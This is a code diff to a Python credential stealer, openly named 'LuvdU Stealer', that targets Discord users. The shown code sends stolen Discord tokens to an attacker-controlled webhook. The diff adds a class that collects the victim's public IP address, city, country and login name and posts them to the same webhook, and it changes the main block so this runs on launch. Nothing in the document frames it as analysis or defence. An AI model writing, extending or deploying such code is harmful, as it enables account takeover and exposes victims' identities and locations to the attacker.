@@ -3,6 +3,7 @@ import json
 import os
 import random
 import re
+import subprocess
 from base64 import b64encode
 
 from Cryptodome.Cipher import AES
@@ -148,12 +149,11 @@ class Discord:
     def sendToken(self, token: str) -> None:
         userData = self.tokenInfo(token)
         print(userData)
-        req = requests.post(
+        requests.post(
             url=webhook,
             headers={
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
-                "Content-Type": "application/json",
-                "Authorization": token
+                "Content-Type": "application/json"
             },
             data=json.dumps({
                 "content": "",
@@ -245,5 +245,31 @@ class Discord:
         return cipher.decrypt(buff[15:])[:-16].decode()
 
 
+class Info:
+    def __init__(self):
+        self.networkInfo = None
+
+        self.sendInfo()
+
+    @staticmethod
+    def sendInfo() -> None:
+        data = requests.get(f"http://ip-api.com/json").json()
+        requests.post(
+            url=webhook,
+            headers={
+                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0",
+                "Content-Type": "application/json"
+            },
+            data=json.dumps({
+                "content": f":flag_{data['countryCode'].lower()}: `{os.getlogin()} {data['query']} [{data['city']}/{data['country']}]`",
+                "tts": False,
+                "components": [],
+                "username": "LuvdU Stealer",
+                "avatar_url": "https://i.imgur.com/444NM0M.jpg"
+            })
+        )
+
+
 if __name__ == "__main__":
-    i = Discord()
+    Info()
+    Discord()
